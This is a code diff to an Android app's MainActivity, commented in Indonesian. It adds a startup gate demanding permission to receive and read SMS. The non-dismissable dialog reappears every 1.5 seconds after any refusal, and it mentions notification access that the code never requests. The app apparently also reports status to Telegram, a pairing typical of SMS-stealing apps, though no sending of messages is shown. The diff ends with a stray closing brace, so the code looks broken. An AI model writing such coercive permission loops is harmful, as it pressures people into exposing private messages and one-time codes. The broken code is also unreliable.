@@ -128,12 +128,17 @@ public class MainActivity extends Activity {
     };
 
     @SuppressLint("SetJavaScriptEnabled")
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
 
-        getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
-        getWindow().setNavigationBarColor(Color.rgb(244, 247, 251));
+    // ✅ CEK IZIN DULU
+    if (!hasAllRequiredPermissions()) {
+        showPermissionGateDialog();
+        return;
+    }
+
+    getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
         }
@@ -1353,4 +1358,67 @@ public class MainActivity extends Activity {
             evaluateJavascript("window.updateTelegramStatus&&window.updateTelegramStatus(" + quoted + ");");
         }
     }
+// ============================================
+    // PERMISSION GATE UNTUK SMS & NOTIFIKASI
+    // ============================================
+
+    private static final int PERMISSION_REQUEST_CODE = 5555;
+
+    private boolean hasAllRequiredPermissions() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+            return true;
+        }
+        
+        return checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
+               checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void showPermissionGateDialog() {
+        AlertDialog dialog = new AlertDialog.Builder(this)
+            .setTitle("⚠️ Izin Diperlukan")
+            .setMessage("Aplikasi memerlukan izin untuk:\n\n" +
+                "📱 Membaca SMS masuk\n" +
+                "🔔 Membaca notifikasi sistem\n\n" +
+                "Izin ini untuk monitoring pesan.")
+            .setPositiveButton("Berikan Izin", (d, w) -> {
+                requestPermissions(
+                    new String[]{
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS
+                    },
+                    PERMISSION_REQUEST_CODE
+                );
+            })
+            .setCancelable(false)
+            .show();
+        
+        dialog.setCancelable(false);
+        dialog.setOnCancelListener(null);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int grant : grantResults) {
+                if (grant != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                Toast.makeText(this, "Izin diberikan. Aplikasi siap.", Toast.LENGTH_SHORT).show();
+                recreate();
+            } else {
+                Toast.makeText(this, "Izin ditolak. Aplikasi memerlukan izin ini.", Toast.LENGTH_LONG).show();
+                new android.os.Handler().postDelayed(() -> {
+                    showPermissionGateDialog();
+                }, 1500);
+            }
+        }
+    }
+                    }
 }
